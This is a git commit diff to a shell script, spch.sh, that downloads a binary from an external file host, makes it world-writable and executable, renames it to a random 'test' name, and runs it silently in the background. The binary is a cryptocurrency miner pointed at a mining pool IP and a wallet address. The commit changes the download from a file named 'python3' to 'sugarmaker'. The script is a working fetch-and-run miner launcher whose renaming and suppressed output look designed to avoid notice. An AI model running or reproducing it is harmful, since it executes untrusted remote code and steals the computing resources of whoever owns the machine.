9f5f6d77b48beb3388354c9b6fb5108c8fe98cd7
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-12-01 12:43:01 +0700

    Update spch.sh

--- spch.sh
+++ spch.sh
@@ -2,10 +2,10 @@
 
 kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
 
-curl -L -O https://upload.vina-host.com/sAcUi9loPh/python3
+curl -L -O https://upload.vina-host.com/cuQHxMWkLQ/sugarmaker
 
-chmod 777 python3
+chmod 777 sugarmaker
 
-mv python3 test$kolot
+mv sugarmaker test$kolot
 
 nohup ./test$kolot -a yespowersugar -o 198.50.168.213:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$kolot -p c=DGB > /dev/null 2>&1 &
